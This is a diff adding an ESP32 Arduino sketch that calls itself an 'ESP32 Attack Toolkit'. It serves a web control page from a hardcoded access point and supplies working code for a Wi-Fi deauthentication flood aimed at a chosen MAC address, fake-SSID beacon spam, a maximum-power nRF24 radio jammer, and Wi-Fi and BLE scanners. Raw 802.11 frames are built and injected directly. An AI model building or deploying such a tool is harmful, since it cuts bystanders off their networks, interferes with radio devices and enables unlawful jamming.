@@ -1,0 +1,264 @@
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <ESPAsyncWebServer.h>
+#include <NimBLEDevice.h>
+#include <RF24.h>
+
+RF24 radio(5, 17);
+
+
+const char* ssid = "hackerdx";
+const char* password = "batman";
+String targetMAC = "";
+
+AsyncWebServer server(80);
+
+
+uint8_t targetMACBytes[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}; // default broadcast
+
+// Convert string "AA:BB:CC:DD:EE:FF" to bytes
+void parseMAC(String macStr, uint8_t* mac) {
+  int values[6];
+  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", 
+                  &values[0], &values[1], &values[2], 
+                  &values[3], &values[4], &values[5])) {
+    for (int i=0; i<6; ++i) mac[i] = (uint8_t) values[i];
+  }
+}
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.softAP(ssid, password);
+  IPAddress IP = WiFi.softAPIP();
+  Serial.print("Web Server IP: ");
+  Serial.println(IP);
+ WiFi.mode(WIFI_MODE_APSTA);
+
+
+  radio.begin();
+radio.setPALevel(RF24_PA_MAX);   // Maximum power
+radio.setDataRate(RF24_250KBPS); // Optional: lower speed = better range
+radio.setChannel(110);           // 2.510 GHz (pick noisy/unused one)
+radio.openWritingPipe(0xE7E7E7E7E7LL); // Arbitrary address
+
+
+  // Web Interface
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    String html = "<h2>ESP32 Attack Toolkit</h2>";
+    html += "<ul>";
+    html += "<li><a href='/wifi_deauth'>WiFi Deauth Flood</a></li>";
+    html += "<li><a href='/wifi_beacon'>Beacon Spam</a></li>";
+    html += "<li><a href='/wifi_scan'>WiFi Scanner</a></li>";
+    html += "<li><a href='/ble_scan'>BLE Scan</a></li>";
+    html += "<li><a href='/nrf_jammer'>NRF Jammer</a></li>";
+    html += "</ul>";
+  
+  // 📡 Channel + MAC Form
+  html += "<hr><h3>Set Wi-Fi Channel & Target MAC</h3>";
+  html += "<form action='/set_channel' method='GET'>";
+  html += "Channel (1-13): <input type='number' name='ch' min='1' max='13'><br>";
+  html += "Target MAC (optional): <input type='text' name='mac'><br>";
+  html += "<input type='submit' value='Set Channel / Target'>";
+  html += "</form>";
+
+  // 📡 Add custom SSID beacon spam form here
+  html += "<hr><h3>Fake SSID Broadcaster</h3>";
+  html += "<form action='/start_beacon' method='GET'>";
+  html += "SSID Name: <input type='text' name='ssid'><br>";
+  html += "Count: <input type='number' name='count' value='20'><br>";
+  html += "<input type='submit' value='Start Beacon Spam'>";
+  html += "</form>";
+
+    request->send(200, "text/html", html);
+  });
+
+  server.on("/wifi_deauth", HTTP_GET, [](AsyncWebServerRequest *request){
+    startDeauthFlood();  // Function defined below
+    request->send(200, "text/plain", "Started Deauth Flood");
+  });
+
+  server.on("/wifi_beacon", HTTP_GET, [](AsyncWebServerRequest *request){
+    startBeaconSpam("batman is here", 100);  // Function defined below
+    request->send(200, "text/plain", "Started Beacon Spam");
+  });
+
+server.on("/start_beacon", HTTP_GET, [](AsyncWebServerRequest *request){
+  String ssid = "TestSSID";
+  int count = 20;
+
+  if (request->hasParam("ssid")) {
+    ssid = request->getParam("ssid")->value();
+  }
+  if (request->hasParam("count")) {
+    count = request->getParam("count")->value().toInt();
+  }
+
+  Serial.printf("Starting beacon spam with SSID: %s, Count: %d\n", ssid.c_str(), count);
+  startBeaconSpam(ssid, count);
+
+  request->send(200, "text/plain", "Beacon spam started for SSID: " + ssid + " with count: " + String(count));
+});
+
+
+  server.on("/ble_scan", HTTP_GET, [](AsyncWebServerRequest *request){
+  String result = startBLEScan(); 
+  request->send(200, "text/plain", result);
+});
+
+  server.on("/wifi_scan", HTTP_GET, [](AsyncWebServerRequest *request){
+    String result = scanWiFi();
+    request->send(200, "text/plain", result);
+  });
+
+  server.on("/nrf_jammer", HTTP_GET, [](AsyncWebServerRequest *request){
+    startNRFJammer(); // NRF logic
+    request->send(200, "text/plain", "NRF Jammer Initiated");
+  });
+
+    server.on("/set_channel", HTTP_GET, [](AsyncWebServerRequest *request){
+    if (request->hasParam("mac")) {
+  String mac = request->getParam("mac")->value();
+  if (mac.length() >= 11) { // quick validation
+    Serial.printf("🎯 Target MAC entered: %s\n", mac.c_str());
+    parseMAC(mac, targetMACBytes); // Convert string to bytes for later use
+  }
+}
+
+    if (request->hasParam("mac")) {
+      String mac = request->getParam("mac")->value();
+      if (mac.length() >= 11) { // quick validation
+        Serial.printf("🎯 Target MAC entered: %s\n", mac.c_str());
+        // Optional: Store this in a global variable to use in deauth logic
+      }
+    }
+
+    request->send(200, "text/plain", "Channel/MAC configured. Go back and run an attack.");
+  });
+
+
+  server.begin();
+}
+
+void loop() {
+  // You can add real-time scanning here or just keep loop empty
+}
+
+
+
+// ========== Beacon Spam Stub ==========
+void startBeaconSpam(String ssid, int count) {
+  Serial.printf("📡 Starting beacon spam: SSID=%s, Count=%d\n", ssid.c_str(), count);
+
+  WiFi.mode(WIFI_MODE_AP);  // Required to send beacon frames
+
+
+  uint8_t beaconPacket[128] = {
+    0x80, 0x00, // Beacon frame
+    0x00, 0x00, // Duration
+    // Destination (broadcast)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    // Source (fake)
+    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
+    // BSSID (same as source)
+    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
+    0x00, 0x00, // Sequence number
+    // Fixed parameters
+    0x00, 0x00, 0x01, 0x00,
+    // Tag: SSID parameter set
+    0x00, ssid.length()
+  };
+
+  memcpy(&beaconPacket[38], ssid.c_str(), ssid.length());
+  int len = 38 + 2 + ssid.length();
+
+  for (int i = 0; i < count; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, len, false);
+    delayMicroseconds(100);
+  }
+
+  Serial.println("✅ Beacon spam done.");
+}
+
+
+
+// ========== BLE Scan ==========
+String startBLEScan() {
+  NimBLEScan* pScan = NimBLEDevice::getScan();
+  pScan->setActiveScan(true);  // Active scan for more data
+  pScan->start(5, false);      // Scan for 5 seconds, don't return immediately
+  NimBLEScanResults results = pScan->getResults();  // Get results after scan
+
+  String output = "BLE Devices Found:\n";
+  for (int i = 0; i < results.getCount(); i++) {
+    output += results.getDevice(i)->toString().c_str();  // Use -> for pointer
+    output += "\n";
+  }
+
+  pScan->clearResults();  // Optional: clean up results
+  return output;
+}
+
+// ========== Wi-Fi Scan ==========
+String scanWiFi() {
+  int n = WiFi.scanNetworks();
+  String result = "Networks found:\n";
+  for (int i = 0; i < n; ++i) {
+    result += WiFi.SSID(i) + " (" + WiFi.RSSI(i) + ")\n";
+  }
+  return result;
+}
+// ========== Wi-Fi Deauth Flood ==========
+const uint8_t deauthPacket[26] = {
+  0xc0, 0x00,                         // Type: management, Subtype: deauth (0xC0)
+  0x3a, 0x01,                         // Duration
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
+  0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source MAC (fake AP MAC)
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID (broadcast)
+  0x00, 0x00,                         // Sequence number
+  0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA
+};
+
+void startDeauthFlood() {
+  Serial.println("⚠️ Starting intense deauth flood...");
+
+  WiFi.mode(WIFI_MODE_STA);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Change channel as needed
+
+  uint8_t deauthPacket[26] = {
+    0xc0, 0x00,
+    0x3a, 0x01,
+    // Destination MAC = targetMACBytes
+    targetMACBytes[0], targetMACBytes[1], targetMACBytes[2], 
+    targetMACBytes[3], targetMACBytes[4], targetMACBytes[5],
+    // Source MAC (fake AP MAC)
+    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
+    // BSSID (broadcast)
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00,
+    0x07, 0x00
+  };
+
+  for (int i = 0; i < 2000; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    delayMicroseconds(100);
+  }
+
+  Serial.println("✅ Deauth flood complete.");
+}
+
+
+
+// ========== NRF24 Jammer Stub ==========
+void startNRFJammer() {
+  Serial.println("⚠️ Starting NRF spam...");
+
+  byte payload[32] = {0xFF}; // Fill with dummy data (max NRF24 payload size is 32 bytes)
+
+  for (int i = 0; i < 1000; i++) {
+    radio.write(&payload, sizeof(payload)); // Send junk
+    delayMicroseconds(100); // You can reduce this if needed
+  }
+
+  Serial.println("✅ NRF spam complete.");
+}
+
